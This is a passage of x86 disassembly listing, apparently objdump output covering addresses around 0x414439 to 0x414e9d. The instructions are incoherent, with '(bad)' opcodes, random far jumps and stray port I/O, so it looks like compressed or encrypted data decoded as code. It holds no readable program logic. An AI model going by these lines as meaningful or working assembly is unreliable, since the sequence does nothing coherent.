  414439:	xor    edi,DWORD PTR [ebp-0xf747d9f]
  41443f:	xchg   esi,eax
  414440:	rol    BYTE PTR [edi+ecx*2],cl
  414443:	sub    al,0x83
  414445:	mov    ecx,0xec37498e
  41444a:	sbb    al,0x19
  41444c:	mov    ds:0x7b3f3fce,eax
  414451:	outs   dx,BYTE PTR ds:[esi]
  414452:	cmp    BYTE PTR [ebp+eiz*8+0x6b88657f],bl
  414459:	cmp    al,0xb0
  41445b:	mov    ebx,0x391e4875
  414460:	xchg   edx,eax
  414461:	add    BYTE PTR [edi],0x6
  414464:	dec    ebp
  414465:	fbld   TBYTE PTR [eax]
  414467:	fucom  st(0)
  414469:	jl     0x4143fc
  41446b:	jl     0x414429
  41446d:	(bad)  
  41446e:	(bad)  
  41446f:	jmp    0xdb814061
  414474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414475:	pop    esi
  414476:	xchg   dh,cl
  414478:	pop    es
  414479:	jge    0x41444d
  41447b:	add    al,0x17
  41447d:	scas   eax,DWORD PTR es:[edi]
  41447e:	fstp   DWORD PTR [ebx-0x7b]
  414481:	xchg   ebx,eax
  414482:	inc    edx
  414483:	pop    edx
  414484:	mov    ebx,0x9c812332
  414489:	mov    al,ds:0x1dc189da
  41448e:	push   ecx
  41448f:	mov    ecx,0x5d
	...
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x44]
  414501:	sti    
  414502:	jl     0x4144d2
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0x8c000001,al
  41450d:	mov    ebp,0x15596979
  414512:	das    
  414513:	sub    eax,0xcbf8e8f
  414518:	push   esi
  414519:	lahf   
  41451a:	mov    dh,0x90
  41451c:	dec    ebp
  41451d:	jmp    0x84e5:0x83934ad1
  414524:	or     esp,DWORD PTR [edi+0x44b12b30]
  41452a:	inc    ecx
  41452b:	pop    es
  41452c:	pop    eax
  41452d:	mov    dl,0x71
  41452f:	inc    ecx
  414530:	je     0x414503
  414532:	dec    eax
  414533:	pop    esp
  414534:	jmp    0xc305:0x26d35e77
  41453b:	fidiv  WORD PTR [edx+0x480666f1]
  414541:	sub    esi,eax
  414543:	loope  0x4145b1
  414545:	adc    eax,0x7b8cc3f8
  41454a:	in     eax,dx
  41454b:	js     0x4145ac
  41454d:	test   al,0xbd
  41454f:	jl     0x4144ff
  414551:	pop    ecx
  414552:	jb     0x41456f
  414554:	sbb    ebp,eax
  414556:	cdq    
  414557:	jo     0x414571
  414559:	je     0x414590
  41455b:	(bad)  
  41455c:	fwait
  41455d:	mov    ?,WORD PTR ds:0x6fb41e5
  414563:	add    BYTE PTR [ebp+0x3],dl
  414566:	sbb    al,0x14
  414568:	(bad)  
  414569:	and    DWORD PTR [ebp-0x1b7277b8],ecx
  41456f:	fwait
  414570:	rcl    BYTE PTR [esi*8-0x3d7e6a18],0x69
  414578:	cmp    ebx,DWORD PTR [eax]
  41457a:	push   edx
  41457b:	sub    eax,0x562247a8
  414580:	mul    DWORD PTR [eax+0x2b8558b5]
  414586:	mov    ds:0x4a3c7a72,al
  41458b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41458c:	pop    esi
  41458d:	lods   eax,DWORD PTR ds:[esi]
  41458e:	mov    esp,0x654f5358
  414593:	sbb    al,0x39
  414595:	imul   eax,DWORD PTR [esi+0x76f81bc3],0x4e
  41459c:	jmp    ecx
  41459e:	or     esp,DWORD PTR [esi-0x5e]
  4145a1:	adc    al,0xf4
  4145a3:	out    0x3c,al
  4145a5:	cmp    ebp,edi
  4145a7:	jns    0x414590
  4145a9:	mov    esi,0x5b86f746
  4145ae:	cwde   
  4145af:	mov    al,ds:0xa43e95b7
  4145b4:	mov    DWORD PTR [ebx+eax*8-0x49],ebp
  4145b8:	cdq    
  4145b9:	jno    0x414554
  4145bb:	ins    DWORD PTR es:[edi],dx
  4145bc:	stos   DWORD PTR es:[edi],eax
  4145bd:	mov    ch,0xc9
  4145bf:	mov    ecx,0xf4aa6291
  4145c4:	sub    bl,dh
  4145c6:	jecxz  0x414612
  4145c8:	es clc 
  4145ca:	push   0xa298f2a1
  4145cf:	out    0x40,al
  4145d1:	push   es
  4145d2:	mov    ebx,0x2bddd168
  4145d7:	mov    ds:0xa8ae57a2,eax
  4145dc:	pop    ebx
  4145dd:	int3   
  4145de:	jp     0x4145d7
  4145e0:	aas    
  4145e1:	inc    esi
  4145e2:	ins    BYTE PTR es:[edi],dx
  4145e3:	cmp    bh,dh
  4145e5:	test   esi,0x2c78840e
  4145eb:	adc    eax,0x2da433e8
  4145f0:	loop   0x414639
  4145f2:	aas    
  4145f3:	std    
  4145f4:	pop    ebp
  4145f5:	dec    edi
  4145f6:	dec    edx
  4145f7:	jecxz  0x4145cc
  4145f9:	jns    0x414651
  4145fb:	cmp    DWORD PTR [ebp+0x67d40d0b],esi
  414601:	fisubr DWORD PTR [edx+0x7a43137a]
  414607:	push   0x4c
  414609:	xchg   ebx,eax
  41460a:	jmp    0x4810:0xd8f30cd5
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x25
  414681:	push   esi
  414682:	push   ds
  414683:	pop    eax
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0xd7000001
  41468d:	inc    edi
  41468e:	stos   BYTE PTR es:[edi],al
  41468f:	adc    BYTE PTR [esi+0x16],al
  414692:	mov    ds:0x4aa4a3fd,al
  414697:	pop    ds
  414698:	mov    WORD PTR [eax+0x4d60b826],gs
  41469e:	pop    esp
  41469f:	and    ebp,ecx
  4146a1:	mov    al,0x6c
  4146a3:	jmp    0x746d7fa9
  4146a8:	or     cl,dl
  4146aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146ab:	jmp    0x433901ce
  4146b0:	mov    esi,DWORD PTR [edi+0x2a]
  4146b3:	jecxz  0x414684
  4146b5:	pop    es
  4146b6:	scas   al,BYTE PTR es:[edi]
  4146b7:	mov    ebx,0x9cd837a3
  4146bc:	pop    edx
  4146bd:	xchg   edi,eax
  4146be:	ret    0xb081
  4146c1:	addr16 mov ebx,0x4f65e86f
  4146c7:	push   0x31396be0
  4146cc:	inc    esi
  4146cd:	inc    edi
  4146ce:	ret    0x4a63
  4146d1:	(bad)  
  4146d2:	aam    0xd5
  4146d4:	(bad)  
  4146d5:	(bad)  
  4146d7:	push   eax
  4146d8:	into   
  4146d9:	adc    al,BYTE PTR [esi-0x3d698eac]
  4146df:	and    al,0x54
  4146e1:	jecxz  0x4146e9
  4146e3:	jns    0x414678
  4146e5:	scas   al,BYTE PTR es:[edi]
  4146e6:	not    BYTE PTR [edi+eiz*4-0x6a3a6ad9]
  4146ed:	adc    al,0xb0
  4146ef:	sar    BYTE PTR [ebx-0x5f],1
  4146f2:	jl     0x4146d2
  4146f4:	xbegin 0x96958784
  4146fa:	test   ebx,ebp
  4146fc:	test   al,0xbf
  4146fe:	pop    es
  4146ff:	ds ins DWORD PTR es:[edi],dx
  414701:	repnz ror DWORD PTR [edi+0x20],0x23
  414706:	mov    edi,0xe821c58c
  41470b:	sar    DWORD PTR [ecx-0x7eb26146],0x32
  414712:	push   cs
  414713:	mov    cl,BYTE PTR [edx-0xd]
  414716:	mov    ds:0x82efd48,al
  41471b:	data16 clc 
  41471d:	cmp    ah,0x48
  414720:	push   0xa828b664
  414725:	xor    esi,DWORD PTR [ecx-0x46]
  414728:	lock add edx,DWORD PTR [ebp+0x3e]
  41472c:	pop    edx
  41472d:	scas   eax,DWORD PTR es:[edi]
  41472e:	fcom   QWORD PTR [ebx]
  414730:	sbb    DWORD PTR [eax+edi*1],eax
  414733:	jae    0x4147ab
  414735:	mov    ss,WORD PTR [ebx-0x49dce0b7]
  41473b:	mov    al,ds:0xe6262da2
  414740:	add    esp,edx
  414742:	(bad)  
  414743:	dec    ebp
  414744:	dec    edx
  414745:	inc    edx
  414746:	mov    esi,0x6deadd53
  41474b:	fs jb  0x4146ee
  41474e:	add    esp,DWORD PTR [edx+0x4]
  414751:	pcmpgtd mm4,QWORD PTR [edx]
  414754:	shr    DWORD PTR [eax-0x521773a7],cl
  41475a:	mov    esp,0x787d95da
  41475f:	cs cs mov esp,eax
  414763:	outs   dx,DWORD PTR ds:[esi]
  414764:	lea    edi,[eax+0x51c4100d]
  41476a:	pop    es
  41476b:	in     eax,0xa9
  41476d:	lods   eax,DWORD PTR ds:[esi]
  41476e:	xchg   esp,eax
  41476f:	push   eax
  414770:	inc    esp
  414771:	call   0xe8d956e8
  414776:	sub    ebx,DWORD PTR [esp+ebx*2-0x239169f6]
  41477d:	dec    esp
  41477e:	test   DWORD PTR [ecx-0x682ac337],ebp
  414784:	pop    edi
  414785:	stos   DWORD PTR es:[edi],eax
  414786:	or     cl,BYTE PTR [edx+edi*1]
  414789:	inc    esi
  41478a:	retf   0x26b0
  41478d:	addr16 ja 0x4147ce
  414790:	or     BYTE PTR [eax],al
	...
  4147f2:	add    BYTE PTR [eax],al
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x954b6602
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0xa3000001
  41480d:	push   ecx
  41480e:	sub    edi,DWORD PTR [ecx-0x66840154]
  414814:	dec    ebx
  414815:	jae    0x4147cb
  414817:	out    0xb,al
  414819:	sbb    esp,ecx
  41481b:	(bad)  
  41481c:	xlat   BYTE PTR ds:[ebx]
  41481d:	gs icebp 
  41481f:	cs jp  0x4147fd
  414822:	mov    BYTE PTR [edx+0x2f],ah
  414825:	loope  0x414846
  414827:	cld    
  414828:	pop    edx
  414829:	or     al,0x9f
  41482b:	scas   eax,DWORD PTR es:[edi]
  41482c:	push   edx
  41482d:	(bad)  
  41482f:	inc    esi
  414830:	push   ebx
  414831:	dec    edx
  414832:	cmp    eax,0x950c42ad
  414837:	pop    ss
  414838:	mov    ebp,0xa5c73c9e
  41483d:	into   
  41483e:	jns    0x414826
  414840:	cli    
  414841:	push   eax
  414842:	pusha  
  414843:	add    DWORD PTR [edi+edx*8+0x49],0xffffff9d
  414848:	pop    esi
  414849:	pop    ecx
  41484a:	retf   0x42
  41484d:	daa    
  41484e:	jo     0x4148a0
  414850:	cmp    eax,0xc6e5e45f
  414855:	icebp  
  414856:	ds aaa 
  414858:	mov    DWORD PTR [edx+0xaaff47d],ebp
  41485e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41485f:	xchg   edi,eax
  414860:	aam    0x40
  414862:	add    eax,0x96fb772f
  414867:	out    dx,eax
  414868:	fisub  DWORD PTR [edx]
  41486a:	pop    edx
  41486b:	into   
  41486c:	in     al,0x60
  41486e:	(bad)  
  41486f:	pusha  
  414870:	das    
  414871:	cld    
  414872:	(bad)  
  414874:	jp     0x41488d
  414876:	bound  ebp,QWORD PTR [edx]
  414878:	cmp    DWORD PTR [ebp+0x2ee84575],eax
  41487e:	aam    0xe3
  414880:	cli    
  414881:	loop   0x41487c
  414883:	sub    BYTE PTR [ecx],0x68
  414886:	js     0x4148ca
  414888:	out    0x37,eax
  41488a:	cli    
  41488b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41488c:	cmp    ah,bl
  41488e:	pop    edx
  41488f:	push   edx
  414890:	and    esp,DWORD PTR [eax+0x7]
  414893:	sub    edx,edx
  414895:	fistp  DWORD PTR [ebp+0x58]
  414898:	mov    dl,0x8c
  41489a:	test   esp,0x84e81ee5
  4148a0:	daa    
  4148a1:	dec    eax
  4148a2:	fsub   DWORD PTR [edi-0x31]
  4148a5:	xlat   BYTE PTR ds:[ebx]
  4148a6:	sbb    eax,0xffabaa52
  4148ab:	test   cl,ch
  4148ad:	mov    eax,ds:0x78facf2
  4148b2:	add    DWORD PTR [eax+0x3c7f1971],ebp
  4148b8:	loopne 0x41490c
  4148ba:	jp     0x4148e0
  4148bc:	adc    BYTE PTR [esi+0x5aa34f6f],0xfb
  4148c3:	xchg   edx,eax
  4148c4:	das    
  4148c5:	inc    eax
  4148c6:	clc    
  4148c7:	pusha  
  4148c8:	jmp    0xc19d:0xdcd7a943
  4148cf:	imul   BYTE PTR [esi]
  4148d1:	ins    BYTE PTR es:[edi],dx
  4148d2:	inc    esp
  4148d3:	inc    edx
  4148d4:	cmp    DWORD PTR [ebx-0x33eb6177],ebp
  4148da:	call   0x21aa:0xc13c2c41
  4148e1:	mov    ebp,0x8ee077ac
  4148e6:	call   0xbfe6f89e
  4148eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148ec:	ret    
  4148ed:	and    edx,DWORD PTR [eax+0x5f]
  4148f0:	cmp    al,0xc6
  4148f2:	ins    DWORD PTR es:[edi],dx
  4148f3:	adc    ebp,esi
  4148f5:	dec    edi
  4148f6:	xor    esp,edx
  4148f8:	sbb    ebx,esp
  4148fa:	fdivp  st(6),st
  4148fc:	inc    edx
  4148fd:	(bad)  
  4148fe:	fwait
  4148ff:	and    ah,bl
  414901:	aam    0x39
  414903:	lods   al,BYTE PTR ds:[esi]
  414904:	push   ss
  414905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414907:	jecxz  0x4148bd
  414909:	inc    edx
  41490a:	mov    ebp,0x72cd5c1b
  41490f:	mov    ecx,0x8e
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	out    dx,eax
  414981:	mov    ds:0xd8ffa95d,eax
  414986:	add    BYTE PTR [eax],al
  414988:	add    eax,0x26000001
  41498d:	jbe    0x4149d7
  41498f:	sub    edx,edx
  414991:	lock aaa 
  414993:	in     al,0x78
  414995:	mov    esi,0x1c38a929
  41499a:	ret    0xfc30
  41499d:	jmp    0x41492a
  41499f:	call   0xe4ad6b8
  4149a4:	hlt    
  4149a5:	pop    ebp
  4149a6:	mov    ecx,ebx
  4149a8:	daa    
  4149a9:	add    al,0x8
  4149ab:	xchg   cl,cl
  4149ad:	pop    es
  4149ae:	cmp    al,0xd5
  4149b0:	mov    edx,0x439c505c
  4149b5:	and    edx,DWORD PTR [eax]
  4149b7:	push   esi
  4149b8:	and    al,BYTE PTR [esi-0x41]
  4149bb:	mov    bl,0x75
  4149bd:	test   BYTE PTR [eax],ch
  4149bf:	(bad)  
  4149c1:	pushf  
  4149c2:	outs   dx,BYTE PTR ds:[esi]
  4149c3:	xor    eax,0x75fc50f2
  4149c8:	mov    esi,cs
  4149ca:	add    eax,0xa228e0dd
  4149cf:	test   eax,0x84d085e3
  4149d4:	xchg   DWORD PTR [ebx],esp
  4149d6:	(bad)  
  4149d8:	add    eax,0x636019d5
  4149dd:	scas   al,BYTE PTR es:[edi]
  4149de:	shl    DWORD PTR [edx-0x422bf914],0x81
  4149e5:	jp     0x414a14
  4149e7:	scas   al,BYTE PTR es:[edi]
  4149e8:	jo     0x4149d4
  4149ea:	sub    ebp,DWORD PTR [ecx]
  4149ec:	jl     0x414982
  4149ee:	xchg   esp,eax
  4149ef:	(bad)  
  4149f0:	cld    
  4149f1:	out    0xa2,al
  4149f3:	inc    ebp
  4149f4:	fidivr WORD PTR [edx+0x4c]
  4149f7:	jbe    0x4149e8
  4149f9:	sahf   
  4149fa:	jmp    0xc1aa16b6
  4149ff:	scas   al,BYTE PTR es:[edi]
  414a00:	ja     0x4149e1
  414a02:	cwde   
  414a03:	test   al,0x7d
  414a05:	mov    dl,0x15
  414a07:	stos   DWORD PTR es:[edi],eax
  414a08:	sub    DWORD PTR [edx],0x24
  414a0b:	jo     0x414a2d
  414a0d:	xor    cl,BYTE PTR [ebx-0x1c]
  414a10:	les    edi,FWORD PTR [edx]
  414a12:	xor    DWORD PTR [edi],ebx
  414a14:	sbb    ch,ch
  414a16:	mov    bl,0x97
  414a18:	ret    0xd855
  414a1b:	in     eax,dx
  414a1c:	mov    BYTE PTR [edi-0x2f],bh
  414a1f:	or     BYTE PTR [ecx+0x42cc224],cl
  414a25:	fistp  DWORD PTR [ebx-0x77]
  414a28:	mov    ds:0x94b330,eax
  414a2d:	pop    ds
  414a2e:	ja     0x414a81
  414a30:	cwde   
  414a31:	aas    
  414a32:	or     BYTE PTR [ecx],bl
  414a34:	xlat   BYTE PTR ds:[ebx]
  414a35:	popf   
  414a36:	aad    0x88
  414a38:	or     eax,0xffffffe1
  414a3b:	and    bh,BYTE PTR [ecx+0x3f]
  414a3e:	retf   
  414a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a40:	jl     0x414a5e
  414a42:	mov    gs,WORD PTR [ebx]
  414a44:	das    
  414a45:	mov    esp,0x46a4c2bf
  414a4a:	ins    DWORD PTR es:[edi],dx
  414a4b:	sar    DWORD PTR [ecx],0x55
  414a4e:	inc    ebp
  414a4f:	cmp    al,0x3c
  414a51:	pusha  
  414a52:	cld    
  414a53:	stc    
  414a54:	push   ds
  414a55:	push   esp
  414a56:	mov    ch,0xb0
  414a58:	jge    0x414a29
  414a5a:	(bad)  
  414a5d:	lds    eax,FWORD PTR [edi+edi*2+0x5b]
  414a61:	add    ah,bl
  414a63:	inc    edx
  414a64:	sub    eax,0x8824049
  414a69:	popa   
  414a6a:	(bad)  
  414a6c:	lds    ebx,FWORD PTR [edi]
  414a6e:	mov    esi,ebp
  414a70:	out    0xd,eax
  414a72:	and    BYTE PTR [esi],cl
  414a74:	sbb    eax,0xacedfc0b
  414a79:	jle    0x414ac9
  414a7b:	mov    es,WORD PTR [ecx+eiz*1+0x5ac3c0c3]
  414a82:	lods   eax,DWORD PTR ds:[esi]
  414a83:	xor    edx,ebp
  414a85:	cdq    
  414a86:	cli    
  414a87:	xor    dl,ah
  414a89:	(bad)  
  414a8a:	(bad)  
  414a8b:	push   ebp
  414a8c:	adc    cl,cl
  414a8e:	dec    esp
  414a8f:	ret    0xfc
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x4b59c27]
  414b02:	retf   
  414b03:	loop   0x414b09
  414b05:	fiadd  DWORD PTR [eax]
  414b07:	add    BYTE PTR ds:0xab000001,al
  414b0d:	mov    esi,0xfb659624
  414b12:	aaa    
  414b13:	xor    cl,BYTE PTR [eax+0x1a]
  414b16:	push   edi
  414b17:	pusha  
  414b18:	std    
  414b19:	push   ebx
  414b1a:	xor    bh,BYTE PTR [edi+0x12c13d18]
  414b20:	xor    eax,0x85b28d2c
  414b25:	sub    eax,DWORD PTR [ebp-0x779ca45c]
  414b2b:	nop
  414b2c:	mov    edx,0xfb427a28
  414b31:	jg     0x414aba
  414b33:	mov    ds:0xd6daeecc,al
  414b38:	shr    DWORD PTR ds:0x33f8e11a,0xf
  414b3f:	arpl   WORD PTR [ecx+0x378c0123],sp
  414b45:	fisub  DWORD PTR [edi]
  414b47:	imul   edi,DWORD PTR [eax-0x1a],0xc20281eb
  414b4e:	push   esp
  414b4f:	xchg   ecx,eax
  414b50:	sub    ch,BYTE PTR [ecx+0x3e]
  414b53:	call   0x9ebf:0xb66a48f0
  414b5a:	mov    esi,0x3b2b66c4
  414b5f:	sub    DWORD PTR [ebp-0x77],edi
  414b62:	call   0x29c5:0xa25bf6a2
  414b69:	add    al,0xfb
  414b6b:	les    ecx,FWORD PTR [edi-0x1a]
  414b6e:	jno    0x414b2a
  414b70:	ins    BYTE PTR es:[edi],dx
  414b71:	pop    ds
  414b72:	test   al,0x8f
  414b74:	clc    
  414b75:	in     eax,0x50
  414b77:	push   0x7f3023b0
  414b7c:	aad    0x73
  414b7e:	mov    BYTE PTR [eax+edx*8],ah
  414b81:	fcomp  DWORD PTR ds:0xbefa9bb4
  414b87:	push   ecx
  414b88:	daa    
  414b89:	retf   
  414b8a:	and    ebp,DWORD PTR [edi+0x33d78c2d]
  414b90:	mov    bh,BYTE PTR [eax]
  414b92:	pushf  
  414b93:	push   edi
  414b94:	aaa    
  414b95:	lds    ebp,FWORD PTR [esi+0x25029be9]
  414b9b:	sub    eax,0xb9643bbe
  414ba0:	push   es
  414ba1:	push   eax
  414ba2:	adc    al,0xf7
  414ba4:	fsub   DWORD PTR [edi+ebx*8]
  414ba7:	dec    ecx
  414ba8:	jmp    0x91e6:0xc7f40fd9
  414baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb0:	inc    ecx
  414bb1:	(bad)  
  414bb2:	mov    edx,0xe53f7629
  414bb7:	and    DWORD PTR [ecx+0x19],edi
  414bba:	lahf   
  414bbb:	push   0x63
  414bbd:	lock add esi,ebp
  414bc0:	imul   BYTE PTR [ebx]
  414bc2:	cmp    al,0x14
  414bc4:	mov    esi,0xce893440
  414bc9:	mov    ebp,0xe20339e6
  414bce:	or     bl,BYTE PTR [ecx]
  414bd0:	pop    ebx
  414bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd2:	lahf   
  414bd3:	cmc    
  414bd4:	loopne 0x414bff
  414bd6:	int3   
  414bd7:	add    eax,0x2406527c
  414bdc:	ja     0x414bd3
  414bde:	js     0x414ba8
  414be0:	mov    ch,0x79
  414be2:	aaa    
  414be3:	mov    ebx,DWORD PTR [ebp-0x7d]
  414be6:	cld    
  414be7:	mov    edi,esi
  414be9:	lods   eax,DWORD PTR ds:[esi]
  414bea:	(bad)  
  414beb:	aaa    
  414bec:	xchg   BYTE PTR [edi+eax*8+0x48],dh
  414bf0:	inc    ebp
  414bf1:	inc    esp
  414bf2:	xchg   BYTE PTR [ecx],dh
  414bf4:	dec    esp
  414bf5:	retf   0x9d35
  414bf8:	jge    0x414b88
  414bfa:	in     eax,0x51
  414bfc:	and    eax,DWORD PTR [ecx+ebx*4]
  414bff:	sbb    eax,0x21c4b3d9
  414c04:	int3   
  414c05:	push   ebp
  414c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c07:	int    0x9c
  414c09:	dec    ecx
  414c0a:	out    dx,eax
  414c0b:	sbb    eax,0x45518331
  414c10:	push   ecx
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[ebx+0x43]
  414c82:	repnz pop edx
  414c84:	or     ebx,ebx
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    eax,0x31000001
  414c8d:	in     eax,dx
  414c8e:	sub    ah,BYTE PTR [esp+edx*8+0x8]
  414c92:	jp     0x414ce0
  414c94:	outs   dx,BYTE PTR ds:[esi]
  414c95:	outs   dx,BYTE PTR ds:[esi]
  414c96:	scas   eax,DWORD PTR es:[edi]
  414c97:	add    dh,dl
  414c99:	inc    esp
  414c9a:	inc    ebx
  414c9b:	or     DWORD PTR ds:0xda130545,edi
  414ca1:	adc    al,0x3c
  414ca3:	das    
  414ca4:	inc    eax
  414ca5:	and    al,0x93
  414ca7:	bound  edx,QWORD PTR [edi]
  414ca9:	aaa    
  414caa:	scas   al,BYTE PTR es:[edi]
  414cab:	pushf  
  414cac:	mov    edi,0x29ae6224
  414cb1:	nop
  414cb2:	int    0x90
  414cb4:	cmp    al,0xeb
  414cb6:	ror    ebx,0x51
  414cb9:	iret   
  414cba:	bnd jmp 0x67cde81
  414cc0:	or     BYTE PTR [esi+ecx*1],ah
  414cc3:	fisub  WORD PTR [edi+0x10]
  414cc6:	sbb    eax,0xd5eb1285
  414ccb:	add    esp,DWORD PTR [esi]
  414ccd:	in     al,dx
  414cce:	sbb    dh,BYTE PTR [ebx+0x21]
  414cd1:	and    esp,edx
  414cd3:	lock bound esp,QWORD PTR [edi+0x12c5292f]
  414cda:	add    eax,0x9b356e8c
  414cdf:	data16 mov bh,0x5c
  414ce2:	mov    DWORD PTR [edx-0x7b],esi
  414ce5:	aam    0x2b
  414ce7:	(bad)  
  414ce9:	aam    0xed
  414ceb:	mov    edi,DWORD PTR [ecx]
  414ced:	sar    DWORD PTR [esi+0x784eb50d],cl
  414cf3:	lock xchg ebp,eax
  414cf5:	push   ds
  414cf6:	cmp    eax,0x514dbe31
  414cfb:	or     DWORD PTR [edx+eiz*4-0x35e68e3e],ebx
  414d02:	call   0x2e4241c9
  414d07:	sub    DWORD PTR [esi+esi*8-0x1ae95760],0x6ab25807
  414d12:	jns    0x414d41
  414d14:	js     0x414d5b
  414d16:	lea    edi,[esi]
  414d18:	aaa    
  414d19:	add    cl,ah
  414d1b:	das    
  414d1c:	add    BYTE PTR [esi-0x2e],bh
  414d1f:	inc    ebp
  414d20:	mov    esi,0xa90dd533
  414d25:	adc    edx,DWORD PTR [esi-0x25c0f909]
  414d2b:	push   esi
  414d2c:	pop    edi
  414d2d:	inc    ecx
  414d2e:	mov    ecx,0x26c43bc1
  414d33:	sbb    DWORD PTR [ecx+0x55bfe4dd],0xffffff87
  414d3a:	and    al,0x23
  414d3c:	jo     0x414db6
  414d3e:	inc    DWORD PTR [ecx+0x42]
  414d41:	cdq    
  414d42:	push   cs
  414d43:	inc    edi
  414d44:	call   0xbacd36a4
  414d49:	into   
  414d4a:	pop    ss
  414d4b:	jno    0x414cd4
  414d4d:	pop    esi
  414d4e:	jmp    0x4777ca90
  414d53:	int3   
  414d54:	push   ebx
  414d55:	call   0x76c6:0x6ea62c90
  414d5c:	mov    ebp,0x4cef043e
  414d61:	mov    al,0xf
  414d63:	mov    eax,0xb30b741c
  414d68:	ficom  WORD PTR ds:0x44cf3c90
  414d6e:	enter  0x5f1c,0x96
  414d72:	and    eax,0xec5386c9
  414d77:	scas   al,BYTE PTR es:[edi]
  414d78:	pop    ss
  414d79:	test   BYTE PTR [esi],dh
  414d7b:	mov    edx,0xebb255e1
  414d80:	add    al,0x77
  414d82:	xor    BYTE PTR [ebx+ebx*2],0xf3
  414d86:	cdq    
  414d87:	call   edx
  414d89:	jl     0x414ded
  414d8b:	sti    
  414d8c:	lods   al,BYTE PTR ds:[esi]
  414d8d:	dec    ecx
  414d8e:	sub    ah,BYTE PTR [ecx]
  414d90:	imul   eax,DWORD PTR [eax],0x0
	...
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x7ea2f84
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0xf000001,al
  414e0d:	sub    dh,bh
  414e0f:	dec    ecx
  414e10:	jns    0x414e54
  414e12:	mov    fs,WORD PTR [esi+edi*2-0x5b502f74]
  414e19:	adc    edi,DWORD PTR [ebx-0x1cfb1898]
  414e1f:	xchg   ecx,eax
  414e20:	jns    0x414dc5
  414e22:	retf   
  414e23:	or     eax,0x73247e23
  414e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e29:	xchg   edi,eax
  414e2a:	lahf   
  414e2b:	daa    
  414e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e2d:	cmp    ecx,DWORD PTR [edx+0x22]
  414e30:	jns    0x414eab
  414e32:	loopne 0x414dc8
  414e34:	pop    es
  414e35:	repz shl DWORD PTR [ebp-0x1e43c17],cl
  414e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e3d:	or     cl,bl
  414e3f:	lea    eax,[edx+0x326951c5]
  414e45:	cs push ds
  414e47:	dec    edi
  414e48:	add    DWORD PTR [edi-0x733ebc1f],esp
  414e4e:	das    
  414e4f:	fmul   QWORD PTR [ebx+0xedadb36]
  414e55:	fld    QWORD PTR [edi]
  414e57:	xchg   cl,ch
  414e59:	xchg   ebx,eax
  414e5a:	inc    ebp
  414e5b:	jae    0x414ec0
  414e5d:	adc    ah,BYTE PTR [edi-0x61]
  414e60:	cmp    eax,0x4a991f6
  414e65:	jl     0x414e78
  414e67:	addr16 sub al,0xc
  414e6a:	jmp    0xf57a931
  414e6f:	push   eax
  414e70:	mov    cl,0xc9
  414e72:	mov    esp,DWORD PTR [edi]
  414e74:	imul   esp,DWORD PTR [ecx-0x67],0x3f
  414e78:	push   ebp
  414e79:	aas    
  414e7a:	outs   dx,BYTE PTR ds:[esi]
  414e7b:	mov    bl,0xb4
  414e7d:	dec    ebp
  414e7e:	iret   
  414e7f:	dec    ecx
  414e80:	pop    esp
  414e81:	and    edi,edi
  414e83:	pusha  
  414e84:	iret   
  414e85:	and    DWORD PTR [ebx-0x1eed7c53],0xffffffb9
  414e8c:	pusha  
  414e8d:	jmp    0x414e55
  414e8f:	sbb    eax,ecx
  414e91:	test   eax,0x7b108d81
  414e96:	mov    ch,0x8b
  414e98:	pop    ecx
  414e99:	jp     0x414eaa
  414e9b:	scas   al,BYTE PTR es:[edi]
  414e9c:	dec    ebp
  414e9d:	inc    edi
